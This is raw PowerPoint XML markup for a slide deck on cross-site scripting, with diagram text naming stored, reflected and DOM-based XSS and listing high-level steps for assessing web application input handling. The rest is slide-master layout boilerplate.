        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B43FAA8B-0CF4-47B4-BB66-3182536609D7}" type="pres">
      <dgm:prSet presAssocID="{62FFC00F-6C83-46C6-ADF7-8FCFCFB6AC89}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CA825F1D-EAF2-4E92-AAA1-D70BFD65F7E2}" type="pres">
      <dgm:prSet presAssocID="{6A88A106-6E32-4E6A-AA56-C380E9D821AE}" presName="parentText" presStyleLbl="node1" presStyleIdx="8" presStyleCnt="10">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E7E7134F-4244-4766-ABB3-6C0788B8E6C0}" type="pres">
      <dgm:prSet presAssocID="{1905847F-224E-4678-A366-030F750F8E6C}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B2A17249-325E-47A9-8AED-282EC45578F0}" type="pres">
      <dgm:prSet presAssocID="{05BCCE9E-9CDE-405D-81A9-6B5B4A27F6C0}" presName="parentText" presStyleLbl="node1" presStyleIdx="9" presStyleCnt="10">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{5AA9B207-1D1D-4CC4-B7DE-864D34EB4CDA}" type="presOf" srcId="{EF159B89-3E80-405F-9BE4-DD6FA0EEACE6}" destId="{0C2A20BB-3874-411B-B4EF-F9893CC7434E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{5D1E7C19-A01E-48FD-81B9-715F988F2A3F}" type="presOf" srcId="{05BCCE9E-9CDE-405D-81A9-6B5B4A27F6C0}" destId="{B2A17249-325E-47A9-8AED-282EC45578F0}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{91FCFB33-5D44-49B1-A790-3FF9E4E9237B}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{257DCFAE-DC0D-441C-9BD4-0F65F99D1B2B}" srcOrd="5" destOrd="0" parTransId="{9C1CD7C1-A276-4112-A98D-DB9420C13C61}" sibTransId="{B4CFC695-5C08-4752-BBBD-E0D256547D91}"/>
    <dgm:cxn modelId="{A4B9F838-BCC2-4E97-B731-00F071147305}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{EB962BD7-7C90-4278-9315-DB6D6EA46FCF}" srcOrd="2" destOrd="0" parTransId="{B138907A-710E-4797-A5CC-416959A7A531}" sibTransId="{2608B0CD-1C5C-4816-9A40-CBA2E1CEC775}"/>
    <dgm:cxn modelId="{178DE639-94D9-4FE2-983B-8E7DC6CA3CE7}" type="presOf" srcId="{142553F7-6672-4E4F-B269-10B321EE36E3}" destId="{0AA2CB1B-3EE6-45D2-8E17-A3A7FFBAC186}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{CCC72D5D-B17C-49E5-936C-D3CDFC35DC61}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{5E474BD1-00F5-4107-9AD7-F07355C26714}" srcOrd="3" destOrd="0" parTransId="{D2CF6A7D-CE87-40E3-AD86-7F58D6B6ED46}" sibTransId="{C92E055D-2189-49F2-AAD5-B49E34DF144E}"/>
    <dgm:cxn modelId="{56506265-3269-45F7-A24E-5FE754211F67}" type="presOf" srcId="{D7002E52-62B8-455A-80D0-159094BF787E}" destId="{7C94F1C1-B85D-4F6D-8FFF-1A2CD078EF32}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{8E272B6C-F8EE-45DD-AB65-B0DE62C87A1A}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{D7002E52-62B8-455A-80D0-159094BF787E}" srcOrd="6" destOrd="0" parTransId="{D140D6ED-B110-4252-93D4-B597FFA24D84}" sibTransId="{0B39518E-1839-4824-9D3E-02A0CCEAB400}"/>
    <dgm:cxn modelId="{BB7D5275-CF1A-447D-9D5E-5A24DAF7F59C}" type="presOf" srcId="{257DCFAE-DC0D-441C-9BD4-0F65F99D1B2B}" destId="{67B8B47A-7B33-4348-A82F-F7A62F7BED26}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{869CA67C-BB93-43D5-88CB-B2EC4C04A29D}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{EF159B89-3E80-405F-9BE4-DD6FA0EEACE6}" srcOrd="1" destOrd="0" parTransId="{FE41E456-0693-44A9-B9A5-1676B426E885}" sibTransId="{8B2AF12D-08A0-4888-8C07-804EC4D83E01}"/>
    <dgm:cxn modelId="{020BD587-546C-4EC7-954A-3BE0742EE40F}" type="presOf" srcId="{5E5A0AD2-3A2B-4CF0-BC0A-34D9D0A640A9}" destId="{D627ABE4-F16C-4946-B6DE-391526BA1262}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{B7A06E8A-ED37-4348-A10E-46EBE32E3D88}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{6A88A106-6E32-4E6A-AA56-C380E9D821AE}" srcOrd="8" destOrd="0" parTransId="{10BF150A-B841-4BD2-B7E7-2AC3D460C96C}" sibTransId="{1905847F-224E-4678-A366-030F750F8E6C}"/>
    <dgm:cxn modelId="{BCFB7C9A-4E14-4F2C-981D-3F376F9B039B}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{142553F7-6672-4E4F-B269-10B321EE36E3}" srcOrd="0" destOrd="0" parTransId="{4804E1DA-4D8A-4E3C-A6E8-8869C5770FDF}" sibTransId="{7ABAF9AA-8EF9-4B3A-849D-4C511E0FA728}"/>
    <dgm:cxn modelId="{1364209E-EC2E-4EC0-B815-08CE6DBA6574}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{05BCCE9E-9CDE-405D-81A9-6B5B4A27F6C0}" srcOrd="9" destOrd="0" parTransId="{224C19EB-BBCD-4177-A22D-6EEA0A8CEE1D}" sibTransId="{D34CD832-9ECA-4935-88C9-95AEAC008DDC}"/>
    <dgm:cxn modelId="{E2B100A6-BC00-415E-875F-5E263D2AAC84}" type="presOf" srcId="{EB962BD7-7C90-4278-9315-DB6D6EA46FCF}" destId="{D91CAFD1-68F7-4892-AB56-2BB8FB647821}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{A23FD9C4-C3E0-436F-884C-15E93788045A}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{7A22F409-EDC5-4F70-AFA9-A7D133497E26}" srcOrd="7" destOrd="0" parTransId="{0DC7A0A4-0D6E-49AB-88BF-221D368F1635}" sibTransId="{62FFC00F-6C83-46C6-ADF7-8FCFCFB6AC89}"/>
    <dgm:cxn modelId="{06411ECC-CA2A-4DDE-89B9-C21D935C050D}" type="presOf" srcId="{7A22F409-EDC5-4F70-AFA9-A7D133497E26}" destId="{F22E466F-F781-4DA8-82A8-4FB6729971CF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{4DBD30CC-F9C1-4801-83BD-37C04933D9CA}" type="presOf" srcId="{5E474BD1-00F5-4107-9AD7-F07355C26714}" destId="{1D90FA77-F9D6-4697-9F5F-EA1F3274E421}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{EF2789D4-8981-43A5-98C3-D84BC840DE47}" type="presOf" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{6B6A46E3-2803-4F63-8289-8C1A070ECAB8}" type="presOf" srcId="{6A88A106-6E32-4E6A-AA56-C380E9D821AE}" destId="{CA825F1D-EAF2-4E92-AAA1-D70BFD65F7E2}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{2DCA2BEE-29CD-4EC8-B8D9-45EAC57D4EF7}" srcId="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" destId="{5E5A0AD2-3A2B-4CF0-BC0A-34D9D0A640A9}" srcOrd="4" destOrd="0" parTransId="{F03F3FE0-E8A7-46FE-A36B-5909D6437750}" sibTransId="{F3E8AD44-1F46-47C7-ACB2-E1B06990FA5B}"/>
    <dgm:cxn modelId="{BC3F0B28-F87D-4E9B-8EF1-D5A6AA954A64}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{0AA2CB1B-3EE6-45D2-8E17-A3A7FFBAC186}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{88C75188-D625-484D-B57D-E144BEA4B2B1}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{C306A941-D7DF-4B60-A0BC-4BA15EEA0EAD}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{0CFA6CA5-946F-4782-8D7A-25964B5D0C13}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{0C2A20BB-3874-411B-B4EF-F9893CC7434E}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{6AD09AAC-284C-45A7-B103-DD419E8428F7}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{633175FB-7E2B-4304-81AC-FD5A97251A55}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{5F451B78-7221-464E-8C80-B8EB6B2BA353}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{D91CAFD1-68F7-4892-AB56-2BB8FB647821}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{1BE31F86-9DEA-420F-9AD3-CD159C79FA5D}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{FA251A8A-4867-4AED-BD0A-2B16066BE68D}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{95ED566F-6BF2-4F42-8312-43EBB2D3C79F}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{1D90FA77-F9D6-4697-9F5F-EA1F3274E421}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{7F7920EB-6A31-4208-91E0-E1EE4E6003EC}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{13E41132-C8EB-4799-917B-76A4DA55091C}" srcOrd="7" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{1B016C40-4A4A-428B-8ABC-087546DE1366}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{D627ABE4-F16C-4946-B6DE-391526BA1262}" srcOrd="8" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D748B067-E657-4E19-AA5F-B3F0D3086F46}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{E4E4897F-2F68-413C-9231-17B8C1E758BF}" srcOrd="9" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{94F69CF3-6354-4CAD-876B-650064ED8F95}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{67B8B47A-7B33-4348-A82F-F7A62F7BED26}" srcOrd="10" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{315BA829-57C8-4CC5-998E-941416FCAD30}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{48D2D1A6-2C41-4066-AB08-75031F74A0B3}" srcOrd="11" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{6F7E170C-FEA7-4453-AD83-C055E730A9FF}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{7C94F1C1-B85D-4F6D-8FFF-1A2CD078EF32}" srcOrd="12" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{EB83759B-9A23-4EED-8C26-A0349BA8E3A0}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{D698589F-4BBC-48E1-BCE0-F4E2DBC60223}" srcOrd="13" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D3FBA5A8-94E9-4BCD-B77C-3691059D201A}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{F22E466F-F781-4DA8-82A8-4FB6729971CF}" srcOrd="14" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{8CC62E93-2309-42EF-9445-51A3A184D386}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{B43FAA8B-0CF4-47B4-BB66-3182536609D7}" srcOrd="15" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{B9D1B63B-F660-48AC-A932-FD0043D1103C}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{CA825F1D-EAF2-4E92-AAA1-D70BFD65F7E2}" srcOrd="16" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{6DC924AB-3310-4C2A-A44C-DDE4F0D3206D}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{E7E7134F-4244-4766-ABB3-6C0788B8E6C0}" srcOrd="17" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{3838F678-C1F1-4EBF-8891-3C06A5B98FDD}" type="presParOf" srcId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" destId="{B2A17249-325E-47A9-8AED-282EC45578F0}" srcOrd="1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FFE1E2-9EF9-4602-87E7-7931A2922D5C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="241815"/>
          <a:ext cx="10515601" cy="1375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n-US" sz="5600" kern="1200"/>
            <a:t>Stored</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="67167" y="308982"/>
        <a:ext cx="10381267" cy="1241586"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{0C3E0CD8-CF36-4DF2-A45F-D1AE7D1A4B50}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1779015"/>
          <a:ext cx="10515601" cy="1375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n-US" sz="5600" kern="1200"/>
            <a:t>Reflected </a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="67167" y="1846182"/>
        <a:ext cx="10381267" cy="1241586"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{5D954F5B-741A-4436-B154-FB9EE923B2FE}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3316215"/>
          <a:ext cx="10515601" cy="1375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n-US" sz="5600" kern="1200" dirty="0"/>
            <a:t>DOM (Document Object Model )</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="67167" y="3383382"/>
        <a:ext cx="10381267" cy="1241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2CB1B-3EE6-45D2-8E17-A3A7FFBAC186}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="10327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Find input points</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="126066"/>
        <a:ext cx="10990722" cy="421252"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{0C2A20BB-3874-411B-B4EF-F9893CC7434E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="62482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Trace where input appears</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="647616"/>
        <a:ext cx="10990722" cy="421252"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{D91CAFD1-68F7-4892-AB56-2BB8FB647821}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="114637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Identify rendering context</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="1169166"/>
        <a:ext cx="10990722" cy="421252"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1D90FA77-F9D6-4697-9F5F-EA1F3274E421}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="166792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Determine whether input is encoded</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="1690716"/>
        <a:ext cx="10990722" cy="421252"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{D627ABE4-F16C-4946-B6DE-391526BA1262}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="218947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Analyze server-side reflection</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="2212266"/>
        <a:ext cx="10990722" cy="421252"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{67B8B47A-7B33-4348-A82F-F7A62F7BED26}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="271102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Analyze client-side JavaScript</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="2733816"/>
        <a:ext cx="10990722" cy="421252"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{7C94F1C1-B85D-4F6D-8FFF-1A2CD078EF32}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="323257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Trace source-to-sink flows</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="3255366"/>
        <a:ext cx="10990722" cy="421252"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F22E466F-F781-4DA8-82A8-4FB6729971CF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="375412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Verify security controls</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="3776916"/>
        <a:ext cx="10990722" cy="421252"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{CA825F1D-EAF2-4E92-AAA1-D70BFD65F7E2}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="427567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Assess exploitability</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="4298466"/>
        <a:ext cx="10990722" cy="421252"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B2A17249-325E-47A9-8AED-282EC45578F0}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4797227"/>
          <a:ext cx="11036300" cy="4668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Document findings</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="22789" y="4820016"/>
        <a:ext cx="10990722" cy="4212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9ED931-FB4C-4731-992B-0306741FCE4E}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>08-10-2026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71150C-6198-4B24-A382-EC03CE21DCEF}"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6A3EF6-2187-41B7-8DB7-8F459CF994A6}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>08-10-2026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D97E0-FD2F-497C-B511-A43CBEE3ED39}"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DD97E0-FD2F-497C-B511-A43CBEE3ED39}"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 cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="35222" t="35220"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="19018"/>
            <a:ext cx="12192000" cy="6857465"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Rounded Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="449690" y="995329"/>
            <a:ext cx="11292619" cy="5474818"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9331"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="33" name="Graphic 32"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip>
            <a:extLst>
              <a:ext uri="{96DAC541-7B7A-43D3-8B79-37D633B846F1}">
                <asvg:svgBlip xmlns:asvg="http://schemas.microsoft.com/office/drawing/2016/SVG/main" r:embed="rId3"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect r="77077"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="11248169" y="19018"/>
            <a:ext cx="673100" cy="919228"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">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userDrawn="1">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835" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1600"/>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3201035" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1600"/>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3658235" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1600"/>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master subtitle style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Date Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="6470147"/>
            <a:ext cx="2743200" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{26BE49E0-C27C-4521-ABE0-A708429F2BA3}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/8/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4038598" y="6470147"/>
            <a:ext cx="4114801" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8610602" y="6470147"/>
            <a:ext cx="2743200" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{94A91F37-3C9A-4D94-B5D4-F002EEAFDA35}"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233488"/>
            <a:ext cx="10515601" cy="19764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3295650"/>
            <a:ext cx="10515601" cy="279400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835" indent="0">
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="82000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3201035" indent="0">
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="82000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3658235"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30FF588E-DB18-459E-9233-B81F34DD6970}"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2"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B52498-24A3-4472-90C8-DB930377A10E}"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7" y="171451"/>
            <a:ext cx="10515601" cy="738188"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="839790" y="1190622"/>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835" indent="0">
              <a:buNone/>
              <a:defRPr sz="1600" b="1"/>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3201035" indent="0">
